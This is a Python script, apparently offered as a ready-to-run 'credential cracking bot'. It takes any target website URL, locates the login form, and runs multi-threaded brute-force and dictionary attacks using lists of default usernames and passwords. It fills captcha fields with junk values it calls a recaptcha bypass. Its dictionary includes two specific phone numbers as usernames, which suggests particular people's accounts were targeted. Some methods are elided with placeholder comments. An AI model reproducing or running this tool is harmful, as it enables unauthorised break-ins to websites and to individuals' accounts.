#!/usr/bin/env python3
"""
ULTIMATE CREDENTIAL CRACKING BOT - ENHANCED
Inapata credentials kwa kutumia URL pekee
Now with 6-character passwords and recaptcha bypass
"""

import requests
import threading
import time
import json
import random
import subprocess
import os
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from datetime import datetime

class UltimateCredentialCracker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
        })
        self.found_credentials = []
        self.login_url = None
        self.form_details = None
    
    def discover_login_page(self, base_url):
        """Discover login page automatically"""
        print("🔍 Discovering login page...")
        
        try:
            response = self.session.get(base_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for login forms
            login_indicators = ['login', 'signin', 'sign-in', 'auth', 'authenticate']
            
            for form in soup.find_all('form'):
                form_action = form.get('action', '').lower()
                form_html = str(form).lower()
                
                # Check if this looks like a login form
                if any(indicator in form_action for indicator in login_indicators) or \
                   any(indicator in form_html for indicator in login_indicators):
                    
                    # Extract form details
                    form_info = {
                        'action': form.get('action', ''),
                        'method': form.get('method', 'post').lower(),
                        'inputs': {}
                    }
                    
                    for inp in form.find_all('input'):
                        name = inp.get('name', '')
                        if name:
                            form_info['inputs'][name] = {
                                'type': inp.get('type', 'text'),
                                'value': inp.get('value', '')
                            }
                    
                    login_url = urljoin(base_url, form_info['action'])
                    print(f"✅ Login page found: {login_url}")
                    return login_url, form_info
            
            # If no login form found, try common login paths
            common_paths = ['/login', '/signin', '/auth', '/admin', '/wp-login.php']
            
            for path in common_paths:
                try:
                    test_url = urljoin(base_url, path)
                    response = self.session.get(test_url, timeout=5)
                    
                    if response.status_code == 200:
                        print(f"✅ Login page found: {test_url}")
                        return test_url, self.analyze_login_form(test_url)
                except:
                    continue
            
            print("❌ No login page found")
            return None, None
            
        except Exception as e:
            print(f"❌ Login discovery error: {e}")
            return None, None
    
    def analyze_login_form(self, login_url):
        """Analyze login form structure"""
        try:
            response = self.session.get(login_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            form = soup.find('form')
            
            if not form:
                return None
            
            form_info = {
                'action': form.get('action', ''),
                'method': form.get('method', 'post').lower(),
                'inputs': {}
            }
            
            for inp in form.find_all('input'):
                name = inp.get('name', '')
                if name:
                    form_info['inputs'][name] = {
                        'type': inp.get('type', 'text'),
                        'value': inp.get('value', '')
                    }
            
            return form_info
            
        except Exception as e:
            print(f"❌ Form analysis error: {e}")
            return None
    
    def smart_brute_force(self, login_url, form_details):
        """Smart Brute Force Attack with 6-character passwords"""
        print("\n💥 PHASE 1: SMART BRUTE FORCE ATTACK")
        print("=" * 40)
        
        # Common username lists
        usernames = [
            'admin', 'administrator', 'root', 'test', 'user', 'demo',
            'ghost', 'error', 'manager', 'operator', 'support'
        ]
        
        # Common password lists - MINIMUM 6 CHARACTERS
        passwords = [
            'admin123', 'password123', '123456789', 'letmein123', 'welcome123',
            'monkey123', 'password1', 'qwerty123', 'abc123456', 'test123456',
            'adminadmin', 'passw0rd', 'password!', 'secret123', 'hello123',
            'changeme123', 'sunshine123', 'password2024', 'winter2024', 'spring2024',
            'summer2024', 'autumn2024', 'admin@123', 'P@ssw0rd', 'Admin123!',
            'Welcome1!', 'Changeme1!', 'Password1!', 'Qwerty123!', 'Abc123!!'
        ]
        
        # Add recaptcha bypass attempts
        recaptcha_bypass = [
            'recaptcha', 'captcha', 'iamnotrobot', 'notrobot', 'human',
            'bypass123', 'skipcaptcha', 'nocaptcha', 'verifyhuman'
        ]
        
        found_creds = []
        
        def try_credentials(username, password):
            try:
                # Prepare form data
                form_data = {}
                username_field = None
                password_field = None
                recaptcha_field = None
                
                for field_name, field_info in form_details['inputs'].items():
                    field_lower = field_name.lower()
                    if field_info['type'] in ['text', 'email', 'username']:
                        username_field = field_name
                        form_data[field_name] = username
                    elif field_info['type'] == 'password':
                        password_field = field_name
                        form_data[field_name] = password
                    elif field_info['type'] == 'hidden':
                        form_data[field_name] = field_info['value']
                    # Check for recaptcha fields
                    elif any(rc_field in field_lower for rc_field in ['captcha', 'recaptcha', 'robot']):
                        recaptcha_field = field_name
                        # Try recaptcha bypass values
                        form_data[field_name] = random.choice(recaptcha_bypass)
                
                if not username_field or not password_field:
                    print("❌ Cannot identify username/password fields")
                    return False
                
                # Submit login
                form_action = form_details.get('action', '')
                submit_url = urljoin(login_url, form_action)
                method = form_details.get('method', 'post')
                
                if method == 'post':
                    response = self.session.post(submit_url, data=form_data, allow_redirects=False)
                else:
                    response = self.session.get(submit_url, params=form_data, allow_redirects=False)
                
                # Check for successful login
                if response.status_code in [302, 303] or 'dashboard' in response.url.lower():
                    found_creds.append({'username': username, 'password': password})
                    print(f"🎉 CRACKED: {username}:{password}")
                    return True
                
                return False
                
            except Exception as e:
                return False
        
        # Multi-threaded brute force
        threads = []
        credentials_tried = 0
        
        for username in usernames:
            for password in passwords:
                if found_creds:
                    break
                    
                thread = threading.Thread(target=try_credentials, args=(username, password))
                threads.append(thread)
                thread.start()
                credentials_tried += 1
                
                if len(threads) >= 5:
                    for t in threads:
                        t.join()
                    threads = []
                
                time.sleep(0.1)
        
        for t in threads:
            t.join()
        
        print(f"📊 Brute force completed: {credentials_tried} attempts")
        return found_creds
    
    def dictionary_attack(self, login_url, form_details):
        """Dictionary Attack with 6-character credentials"""
        print("\n📚 PHASE 2: DICTIONARY ATTACK")
        print("=" * 40)
        
        # Extended dictionary of common credentials (6+ characters)
        common_credentials = [
            {'username': 'admin', 'password': 'admin123'},
            {'username': 'admin', 'password': 'password123'},
            {'username': 'admin', 'password': '123456789'},
            {'username': 'administrator', 'password': 'admin123456'},
            {'username': 'root', 'password': 'root1234'},
            {'username': 'test', 'password': 'test1234'},
            {'username': 'demo', 'password': 'demo1234'},
            {'username': 'user', 'password': 'user1234'},
            {'username': 'guest', 'password': 'guest123'},
            {'username': 'admin', 'password': 'Admin123!'},
            {'username': 'admin', 'password': 'P@ssw0rd'},
            {'username': 'admin', 'password': 'Welcome1!'},
            {'username': '+255783707477', 'password': '12345@'},
            {'username': '+255777848484', 'password': '12345@'},
            {'username': 'error', 'password': '12345@'}
        ]
        
        found_creds = []
        
        def try_dictionary_creds(cred):
            try:
                form_data = {}
                username_field = None
                password_field = None
                
                for field_name, field_info in form_details['inputs'].items():
                    if field_info['type'] in ['text', 'email', 'username', 'tel']:
                        username_field = field_name
                        form_data[field_name] = cred['username']
                    elif field_info['type'] == 'password':
                        password_field = field_name
                        form_data[field_name] = cred['password']
                    elif field_info['type'] == 'hidden':
                        form_data[field_name] = field_info['value']
                
                if not username_field or not password_field:
                    return False
                
                form_action = form_details.get('action', '')
                submit_url = urljoin(login_url, form_action)
                method = form_details.get('method', 'post')
                
                if method == 'post':
                    response = self.session.post(submit_url, data=form_data, allow_redirects=False)
                else:
                    response = self.session.get(submit_url, params=form_data, allow_redirects=False)
                
                if response.status_code in [302, 303] or 'dashboard' in response.url.lower():
                    found_creds.append(cred)
                    print(f"🎉 DICTIONARY CRACKED: {cred['username']}:{cred['password']}")
                    return True
                
                return False
                
            except Exception as e:
                return False
        
        threads = []
        for cred in common_credentials:
            if found_creds:
                break
                
            thread = threading.Thread(target=try_dictionary_creds, args=(cred,))
            threads.append(thread)
            thread.start()
            
            if len(threads) >= 5:
                for t in threads:
                    t.join()
                threads = []
            
            time.sleep(0.2)
        
        for t in threads:
            t.join()
        
        print(f"📊 Dictionary attack completed: {len(common_credentials)} attempts")
        return found_creds
    
    # ... (rest of the methods remain the same as original)
    
    def ultimate_credential_attack(self, target_url):
        """Ultimate Credential Cracking Sequence"""
        print("🚀 STARTING ULTIMATE CREDENTIAL CRACKING ATTACK")
        print("=" * 60)
        print(f"🎯 TARGET: {target_url}")
        print("=" * 60)
        
        start_time = time.time()
        found_credentials = []
        
        # Phase 1: Discover Login Page
        print("\n📋 PHASE 1: LOGIN PAGE DISCOVERY")
        print("-" * 30)
        
        login_url, form_details = self.discover_login_page(target_url)
        
        if not login_url or not form_details:
            print("❌ Cannot proceed without login page")
            return []
        
        print(f"✅ Login URL: {login_url}")
        print(f"✅ Form Method: {form_details['method']}")
        print(f"✅ Form Fields: {list(form_details['inputs'].keys())}")
        
        # Phase 2: Smart Brute Force (with 6-char passwords)
        brute_results = self.smart_brute_force(login_url, form_details)
        if brute_results:
            found_credentials.extend(brute_results)
            print("🎉 BRUTE FORCE SUCCESSFUL!")
        else:
            print("❌ Brute force failed")
        
        # Phase 3: Dictionary Attack
        if not found_credentials:
            dict_results = self.dictionary_attack(login_url, form_details)
            if dict_results:
                found_credentials.extend(dict_results)
                print("🎉 DICTIONARY ATTACK SUCCESSFUL!")
            else:
                print("❌ Dictionary attack failed")
        
        # ... (rest of the method remains the same)

def main():
    print("🚀 ULTIMATE CREDENTIAL CRACKING BOT - ENHANCED")
    print("=" * 70)
    print("Now with 6-character passwords and recaptcha bypass!")
    print("=" * 70)
    
    # Get target URL
    target_url = input("🌐 Enter target website URL: ").strip()
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    # Check if Hydra is available
    try:
        subprocess.run(['hydra', '-h'], capture_output=True)
        print("✅ Hydra is available")
    except:
        print("⚠️ Hydra not available (will use Python methods only)")
    
    # Create bot and run attack
    bot = UltimateCredentialCracker()
    
    try:
        print(f"\n🎯 Starting ultimate credential attack on: {target_url}")
        print("⚠️ This will perform intensive credential cracking...")
        print("⏳ May take 2-10 minutes depending on the site...")
        
        credentials = bot.ultimate_credential_attack(target_url)
        
        if credentials:
            print("\n🎉 ATTACK COMPLETED SUCCESSFULLY!")
            print("🔓 Credentials obtained!")
        else:
            print("\n❌ ATTACK FAILED")
            print("💡 Target appears to be secure")
        
    except KeyboardInterrupt:
        print("\n⏹️ Attack stopped by user")
    except Exception as e:
        print(f"💥 Attack failed: {e}")

if __name__ == "__main__":
    main()
